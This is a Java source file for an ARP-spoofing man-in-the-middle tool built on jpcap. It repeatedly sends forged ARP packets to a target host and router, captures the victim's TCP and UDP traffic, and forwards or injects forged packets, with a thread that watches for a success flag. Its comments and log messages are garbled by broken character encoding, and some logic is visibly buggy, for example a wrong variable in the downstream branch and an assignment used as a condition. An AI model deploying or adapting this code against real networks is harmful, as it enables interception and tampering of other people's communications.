package Manager;


import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Properties;
import java.util.Set;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.BrokenBarrierException;
import java.util.concurrent.CyclicBarrier;





import javax.crypto.Mac;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.Packet;
import jpcap.packet.TCPPacket;
import jpcap.packet.UDPPacket;
import Factory.ARPFactory;
import Manager.Listenner.PackageListenner;
import Manager.Listenner.basicListenner;
import Manager.Strategy.PushUpdata;
import Model.DB_csv_device;
import Model.TestPacketReceiver;

public class Manager_cheatServiceAndHost_5 {
	
	
	//���Ͷ���
	final BlockingQueue<Packet> sendQueue = new ArrayBlockingQueue<Packet>(10);
	
	//����ץȡ���������ݰ���ÿ��ץȡ���������
	//CopyOnWriteArrayList<Packet> pakage_up = new CopyOnWriteArrayList<Packet>();
	Packet pakage_up = null;
	//����ץȡ���������ݰ���ÿ��ץȡ���������
	//CopyOnWriteArrayList<Packet> pakage_down = new CopyOnWriteArrayList<Packet>();
	Packet pakage_down = null;
	
	//���߳�����������
	final  CyclicBarrier cb = new CyclicBarrier(2);
	final  CyclicBarrier cb1 = new CyclicBarrier(2);
	
	//���еļ�����
	List<PackageListenner> listenners = new ArrayList<PackageListenner>();
	
	//������pushUpdata
	PushUpdata pushUpdata = null;
	
	
	//���Ƴɹ���־λflag
	private int craResultFlag ;
	//��������ֹͣ�̿��Ʊ�־
	volatile private boolean stopFlag = true;
	
	
	//�����ļ�
	static int ARP_INTERVAL;
	//static int NETCARD_INDEX;
	
	//static String HOST_IP;
	//static String SERVICE_IP;
	//static String ROUTE_IP;
	
	static String YOUR_DEVICE_MAC;
	//static String TARGET_HOST_MAC;
	//static String TARGET_ROUTE_MAC;
	
	
	//��ʼ�����ݶ�ȡ
	//static String[] LISTENNER_DEVICES; 
	
	{
		readProperties();
		
	}
	
	
	
	/*************************************************
	 * ������������ʹ��
	 *************************************************/	
	/*public static void main(String[] args) {
		
		Manager_cheatServiceAndHost_5 mc= new Manager_cheatServiceAndHost_5();
		
		//JpcapSender js = getCrad(NETCARD_INDEX,null);
		JpcapSender js = getCradByMAC(YOUR_DEVICE_MAC);
		
		//��ȡ�������ݰ�������
		
		*//*************************************************
		 * ��ץȡ�����ݰ���÷������ݶ���
		 *************************************************//*
		mc.loadListenner();
		
		*//*************************************************
		 * α��ARP���ݣ���ӵ��������б���
		 *************************************************//*                                                       
		mc.setARPs(HOST_IP,ROUTE_IP,YOUR_DEVICE_MAC,TARGET_HOST_MAC,null);
		
		
		*//************************************************* 
		 * ���������̣߳���鷢���б���Ҫ��ͣ�ķ���
		 *************************************************//*
		mc.sentThread(js);
		
		*//*************************************************
		 * ARP��ƭ�ɹ��󣬿�ʼ�����������͵����ݷ��뵽cpmodel��,
		 * ���Ҽ����α�����ݼ��뵽�����б�
		 *************************************************//*
		//mc.capPacket_run(NETCARD_INDEX,HOST_IP,SERVICE_IP,YOUR_DEVICE_MAC);
		mc.capPacket_runByMAC(HOST_IP,SERVICE_IP,YOUR_DEVICE_MAC);
		
		
		*//*************************************************
		 * ����listener��push������
		 *************************************************//*
		mc.loadPusher(2,YOUR_DEVICE_MAC,TARGET_HOST_MAC,TARGET_ROUTE_MAC,HOST_IP);
		
		
		*//*************************************************
		 * �����������Ʊ�־λ
		 *************************************************//*
		mc.abservationFlag();
		
	}*/
	
	
	/*************************************************
	 * ��������,Ϊ���������ʱ�ṩ�ӿ�
	 *************************************************/
	public void start(String host_IP, String router_IP,String service_IP,String Host_MAC,String router_MAC,DB_csv_device dbModel){
		
		//��ȡ�������ݰ�������
		JpcapSender js = getCradByMAC(YOUR_DEVICE_MAC);
		
		//��ȡ�������ݰ�������
		
		/*************************************************
		 * ��ץȡ�����ݰ���÷������ݶ���
		 *************************************************/
		
		loadListenner(Host_MAC,dbModel);
		
		/*************************************************
		 * α��ARP���ݣ���ӵ��������б���
		 *************************************************/                                                       
		setARPs(host_IP,router_IP,YOUR_DEVICE_MAC,Host_MAC,null);
		
		
		/************************************************* 
		 * ���������̣߳���鷢���б���Ҫ��ͣ�ķ���
		 *************************************************/
	     sentThread(js);
		
		/*************************************************
		 * ARP��ƭ�ɹ��󣬿�ʼ�����������͵����ݷ��뵽cpmodel��,
		 * ���Ҽ����α�����ݼ��뵽�����б�
		 *************************************************/
		capPacket_runByMAC(host_IP,service_IP,YOUR_DEVICE_MAC);
		
		
		/*************************************************
		 * ѡ��ģʽ������α���̣߳���ʼα������,����ӵ��������б�
		 * ģʽһ��ֻת������
		 * ģʽ�������������ͷ����������ݣ����ҷ���α����������ͨ��
		 *************************************************/
		loadPusher(2,YOUR_DEVICE_MAC,Host_MAC,router_MAC,host_IP);
		
		/*************************************************
		 * �����������Ʊ�־λ
		 *************************************************/
		abservationFlag();
	}
	
	
	/*************************************************
	 * end
	 *************************************************/
	
	
	/*************************************************
	 * ��ץȡ�����ݰ���ʶ����������ݶ���
	 *************************************************/
	private void loadListenner(String hostMAC,DB_csv_device dbmodel){
		
		final String Mac = hostMAC;
		final DB_csv_device db = dbmodel;
		Runnable run = new Runnable() {
			
			@Override
			public void run() {
				
				
				/*if(LISTENNER_DEVICES.length!=0 && !LISTENNER_DEVICES[0].equals("")){
					
					for(String device:LISTENNER_DEVICES){
						
						try {
							
							new  basicListenner();
							listenners.add((PackageListenner)( Class.forName(device).getConstructor(BlockingQueue.class).newInstance(sendQueue) ));
							
						} catch (Exception e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
							
						
					}
					System.out.println("�����豸listener��ӳɹ�  ��:"+listenners.size());
					
				}*/
				//ʹ�ü�ģ��
				listenners.add(new basicListenner(sendQueue,Mac,db));
				
				System.out.println("�����豸listener��ӳɹ�  ��:"+listenners.size());
				
					try {
						cb.await();
					} catch (InterruptedException | BrokenBarrierException e){
						e.printStackTrace();
					}
					
					
			}
		};
		
		System.out.println("��ʼ�������ƶ���");
		new Thread(run).start();
	}
	/*************************************************
	 * end
	 *************************************************/
	
	
	/*************************************************
	 * ץ���̵߳�һ��������������ţ�����������IP�ͷ�����IP,����MAC��ַ
	 *************************************************/
	private  void capPacket_runByMAC(final String host_ip, final String service_ip ,final String yourMAC){
	    
		
			String macString = yourMAC.replaceAll(":","");
			
	       try{    
	            //��ȡ�����ϵ�����ӿڶ�������    
	     final  NetworkInterface[] devices = JpcapCaptor.getDeviceList(); 
	     NetworkInterface nc = null;
	     for(int i=0;i<devices.length;i++){
	    	 
	    	 if(bytesToHexString(devices[i].mac_address).equals(macString)){
	    		 nc = devices[i];
	    		 break;
	    	 }
	    	 
	     }
	        //����ĳ�������ϵ�ץȡ����,�������һ����ץ����СΪ2000byte
	        final JpcapCaptor jpcap = JpcapCaptor.openDevice(nc, 2000, true, 20); 
	        jpcap.setFilter("ip and tcp", true);
	        
	         Runnable run = new Runnable() {
				
				@Override
				public void run() {
					// TODO Auto-generated method stub
					System.out.println("����ץ���߳�");
					//�Ƿ�ÿһ����Ҫ��ͬ��Pr
					TestPacketReceiver pr = new TestPacketReceiver(host_ip,yourMAC);
					while(stopFlag){
						startCapThread(jpcap,host_ip,service_ip,pr);
					}	
				}
			};
			
			new Thread(run).start();
	            
	        System.out.println("׼����ȡ"+macString+"�ϵ�����");    
  
	        }catch(Exception ef){    
	            ef.printStackTrace();    
	            System.out.println("����ʧ��:  "+ef);    
	        }      
	   }
	
	
	/*************************************************
	 * ץ���̵߳�һ��������������ţ�����������IP�ͷ�����IP
	 *************************************************/
	public  void capPacket_run(int i,final String host_ip, final String service_ip ,final String yourMAC){
	    
	       try{    
	            //��ȡ�����ϵ�����ӿڶ�������    
	     final  NetworkInterface[] devices = JpcapCaptor.getDeviceList();    
	            
	        NetworkInterface nc=devices[i];    
	        //����ĳ�������ϵ�ץȡ����,�������һ����ץ����СΪ2000byte
	        final JpcapCaptor jpcap = JpcapCaptor.openDevice(nc, 2000, true, 20); 
	        jpcap.setFilter("ip and tcp", true);
	        
	         Runnable run = new Runnable() {
				
				@Override
				public void run() {
					// TODO Auto-generated method stub
					
					try {
						  //�ȴ�pusher����
						cb1.await();
					} catch (InterruptedException | BrokenBarrierException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					
					System.out.println("����ץ���߳�");
					//�Ƿ�ÿһ����Ҫ��ͬ��Pr
					TestPacketReceiver pr = new TestPacketReceiver(host_ip,yourMAC);
					while(stopFlag){
						startCapThread(jpcap,host_ip,service_ip,pr);
					}	
				}
			};
			
			new Thread(run).start();
	            
	        System.out.println("׼����ȡ��"+i+"�������ϵ�����");    
  
	        }catch(Exception ef){    
	            ef.printStackTrace();    
	            System.out.println("����ʧ��:  "+ef);    
	        }      
	   }
	    //��Captor�ŵ������߳�������    
	private  void startCapThread(final JpcapCaptor jpcap,final String host_ip,final String service_ip,TestPacketReceiver pr){    
	       //JpcapCaptor jp=jpcap;    
    	  // while(true){}    
  		 //ʹ�ýӰ�������ѭ��ץ��-1��ʾ�����Ƶ�ץȡ���ݰ�   "192.168.8.101","119.29.42.117"
  		  jpcap.loopPacket(1, pr);
  		  
  		  if(pr.getPacket() != null){

  			  Packet packet = pr.getPacket();
  			  
  			  
  			  //TCP֡ 
  			  if(packet instanceof jpcap.packet.TCPPacket){
  				  TCPPacket tcpPacket = (TCPPacket)packet;
  				  
  				  if(tcpPacket.syn){
  					  
  					  System.out.println("����֡......������");
  					  	
  				  }
  				//��������
  				  else if(host_ip.equals(tcpPacket.src_ip.getHostAddress())){
  					  
  					  pakage_up = pushUpdata.pushAfterDeal(pakage_up, tcpPacket);
  				  }
  				//����������
  				  else if(host_ip.equals(tcpPacket.dst_ip.getHostAddress())){
  					 
  					pakage_up = pushUpdata.pushAfterDeal(pakage_down, tcpPacket);
  				  }
  				  
  				
  			  }	  
  			  
  			 //udp���ݰ�������ǰ����
  			  else if(packet instanceof UDPPacket){
  				  UDPPacket udpPacket = (UDPPacket)packet;
  				  
  				  //��������
  				  if(host_ip.equals(udpPacket.src_ip.getHostAddress())){
  					  
  					  pushUpdata.pushAfterDeal(null, udpPacket);
  				  }
  				  //��������
  				  else if(host_ip.equals(udpPacket.dst_ip.getHostAddress())) {
  					
  					pushUpdata.pushAfterDeal(null, udpPacket);
  				  }
  				  
  				  
  			  }
  			  
  		  }  
  	   
       
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	   
	 /*************************************************
	 * �����߳�
	 *************************************************/
	private void sentThread(final JpcapSender js){
		   
		   java.lang.Runnable runner = new Runnable(){

				@Override
				public void run() {
					
					try {
						//��ͣ�ķ���
						while(stopFlag){
							if(js != null){
									
								Packet packet = sendQueue.take();
								if(packet instanceof jpcap.packet.ARPPacket){
									
									System.out.println("sending arp.."); 
									
								}
								if(packet instanceof jpcap.packet.TCPPacket){
									
									TCPPacket tcpPacket = (TCPPacket)packet;
									System.out.println("sending TCPtohost.."+"seq|"+tcpPacket.sequence+
														" ack|"+tcpPacket.ack_num);
								}
								if(packet instanceof jpcap.packet.UDPPacket){
									
									UDPPacket udp = (UDPPacket) packet;
									System.out.println("sending UDP...."+"  lenth:"+udp.data.length);
								}
								
								js.sendPacket(packet);
							}
							
						}
					} catch (Exception e) {
						System.out.println("���������̳߳���");
						e.printStackTrace();
					}
				}
				
			};
			
			Thread senThread = new Thread(runner);
			senThread.start();
			//new Thread(runner).start();
		   System.out.println("�����߳�����");
		   
	   } 
	 /*************************************************
	 * end
	 *************************************************/
	   
	 /*************************************************
	 * ARPs����
	 *************************************************/
	private  void setARPs(String hostIP,String routeIP,String yourMAC,String deviceMAC,String routeMAC){
		  
		   ARPFactory arpFactory = null;
		   if(routeMAC == null){
			   arpFactory = new ARPFactory(hostIP, routeIP, yourMAC, deviceMAC);
		   }else{
			   
			   arpFactory = new ARPFactory(hostIP, routeIP, yourMAC, deviceMAC, routeMAC);
		   }
		  
		   final ARPFactory arpFactory1 = arpFactory;
		  Runnable run = new Runnable() {
			
			@Override
			public void run() {
				Set<ARPPacket> ARPs = null;
				Iterator<ARPPacket> it = null;
				
				//��Ҫһ����־λ������ֹͣ
				while(stopFlag){
					ARPs = arpFactory1.getInstance();
					it = ARPs.iterator();
					//��arp���뷢�Ͷ���
					while(it.hasNext()){
						try {
							sendQueue.put(it.next());
						} catch (InterruptedException e) {
							e.printStackTrace();
						}	
					}
					//ÿ����һ��ָֹͣ����ʱ��ARP_INTERVAL
					try {
						Thread.sleep(ARP_INTERVAL);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}
		  };
		  
		  
		  new Thread(run).start();
		  
	   }
	   
	 /*************************************************
	 * end
	 *************************************************/
	   
	   
	  /*************************************************
	 * α�����ݰ��߳�,��Ϊ����ģʽ
	 *************************************************/
	private  void loadPusher(int flags,final String  yourMAC,final String hostMAC,final String rounteMAC,final String host_ip){
		   
		   //ģʽһΪֱ��ת�����յ�������

		   //ģʽ2Ϊ���ضԷ�����,ת���Լ�α�������
		    //if(flag == 2){
			   java.lang.Runnable runner = new  Runnable() {
				   public void run() {
					  // System.out.println("���뵽α���߳�1");
					  // int step = 0;
					   try {
							  //�ȴ���ȡ�����ļ��е�listeners
							cb.await();
						} catch (InterruptedException | BrokenBarrierException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					   pushUpdata = new PushUpdata(yourMAC, hostMAC, rounteMAC, host_ip);
					   
					   if(listenners.size()!=0){
						   for(PackageListenner listenner : listenners){
							   pushUpdata.addListenner(listenner);
						   }
					   }
					   
					   try {
							  //����ץ���̣߳�ֻ����pusher׼�����֮��ץȡ���ݰ����ܽ���
							cb1.await();
						} catch (InterruptedException | BrokenBarrierException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
				   }
			   };  
			   
			   Thread fakeThread = new Thread(runner);
			   fakeThread.start();
		   //}
		    
	   }
	   /*************************************************
	   * end
	   *************************************************/
	  
	  /*************************************************
	   * ������鷴�Ƴɹ����߳�
	   *************************************************/
	  public void abservationFlag(){
		  
		  java.lang.Runnable  run =  new Runnable() {
			public void run() {
				while(true){
					if(pushUpdata!=null){
						if(pushUpdata.getListenners().size()!=0){
							int i = pushUpdata.cheakFlag();
							if(i ==2){
								 craResultFlag = i; 
								System.out.println("Ŀ���豸���Ƴɹ�  flag:"+craResultFlag);
								break;
							}
							
						}
						
					}
					
				}
			}
		};
		  
		new Thread(run).start();
	  }
	  /*************************************************
	 * end
	 *************************************************/
	  
	  /*************************************************
	 * �ṩ��һ���رշ����̵߳Ĺ���
	 *************************************************/
	  public void counterOver(){
		  
		  if(this.stopFlag=true){
			  
			  this.stopFlag =false;
		  }
		  
	  }
	  
	  /*************************************************
	 * end
	 *************************************************/
	  
	  
	  
	  
	   /*************************************************
	   * ��ȡ�����������ݵ�����
	   *************************************************/
	  public static JpcapSender getCrad(int deviceNum,String NetCard_MAC){
				  
					NetworkInterface[] devices = null;
					 try{    
						 //��ȡ�����ϵ�����ӿڶ�������    
						  devices = JpcapCaptor.getDeviceList();
System.out.println("������ȡ�ɹ�  ");  
						 }catch(Exception ef){    
						            ef.printStackTrace();    
System.out.println("��ʾ����ӿ�����ʧ��:  "+ef);    
						    }  
					 
					JpcapSender js = null;
					
					try {
						js = JpcapSender.openDevice(devices[deviceNum]);
System.out.println("�ѻ�ȡ����(����ʹ��)  "+deviceNum+"  JSender�����ɹ�");  				
					} catch (IOException e1) {
System.out.println("JSender�������ɹ�");
						e1.printStackTrace();
					}
					  
				  return js;
			  } 
			  /*************************************************
			 * end
			 *************************************************/
		
		/*************************************************
		 * �ֽ�����ת��
		 *************************************************/
	  private static String  bytesToHexString(byte[] src){  
		    StringBuilder stringBuilder = new StringBuilder("");  
		    if (src == null || src.length <= 0) {  
		        return null;  
		    }  
		    for (int i = 0; i < src.length; i++) {  
		        int v = src[i] & 0xFF;  
		        String hv = Integer.toHexString(v);  
		        if (hv.length() < 2) {  
		            stringBuilder.append(0);  
		        }  
		        stringBuilder.append(hv);  
		    }  
		    return stringBuilder.toString();  
		} 
		
		
		/*************************************************
		 * end
		 *************************************************/
		
		
		/*************************************************
		   * ��ȡ�����������ݵ�����------����MAC��ַ
		   *************************************************/
	  private static JpcapSender getCradByMAC(String mac){
					  
				String macString = mac.replaceAll(":","");
				
						NetworkInterface[] devices = null;
						 try{    
							 //��ȡ�����ϵ�����ӿڶ�������    
							  devices = JpcapCaptor.getDeviceList();
	System.out.println("������ȡ�ɹ�  ");  
							 }catch(Exception ef){    
							            ef.printStackTrace();    
	System.out.println("��ʾ����ӿ�����ʧ��:  "+ef);    
							    }  
						JpcapSender js = null;
						
						for(int i = 0 ;i<devices.length;i++){
							if(bytesToHexString(devices[i].mac_address).equals(macString)){
								
								try {
									js = JpcapSender.openDevice(devices[i]);
			System.out.println("�ѻ�ȡ����(����ʹ��)  "+i+"   mac:"+ macString+"  JSender�����ɹ�");  				
								} catch (IOException e1) {
			System.out.println("JSender�������ɹ�");
									e1.printStackTrace();
								}
								break;
							}
						}
					  return js;
				  } 
				  /*************************************************
				 * end
				 *************************************************/
		
		
		
		
		/*************************************************
		 * ��ȡ�����ļ�prameter.properties
		 *************************************************/
	  private void readProperties(){
			  	
				Properties prop = new Properties();
				InputStream in = Object. class .getResourceAsStream( "/counterProperties.properties" );    
		        try  {    
		           prop.load(in);    
		 
		           ARP_INTERVAL = Integer.parseInt(prop.getProperty( "ARP_INTERVAL" ).trim()); 
		           /*NETCARD_INDEX = Integer.parseInt(prop.getProperty( "NETCARD_INDEX" ).trim());
		           HOST_IP = prop.getProperty( "HOST_IP" ).trim();
		           if(!prop.getProperty( "SERVICE_IP" ).trim().equals("")){
		        	   SERVICE_IP = prop.getProperty( "SERVICE_IP" ).trim();  
		           }else {
		        	   SERVICE_IP = null;
		           }*/
		           
		           //ROUTE_IP = prop.getProperty( "ROUTE_IP" ).trim();
		           YOUR_DEVICE_MAC = prop.getProperty( "YOUR_DEVICE_MAC" ).trim();
		           //TARGET_HOST_MAC = prop.getProperty( "TARGET_HOST_MAC" ).trim();
		           //TARGET_ROUTE_MAC = prop.getProperty( "TARGET_ROUTE_MAC" ).trim();
		           //LISTENNER_DEVICES =  prop.getProperty( "LISTENNER_DEVICES" ).trim().split(",");
		       }  catch  (IOException e) {    
		           e.printStackTrace();    
		       }  
		         
		     
		  }
		  /*************************************************
		 * end
		 *************************************************/


		public int getCraResultFlag() {
			return craResultFlag;
		}


		public void setCraResultFlag(int craResultFlag) {
			this.craResultFlag = craResultFlag;
		}
}    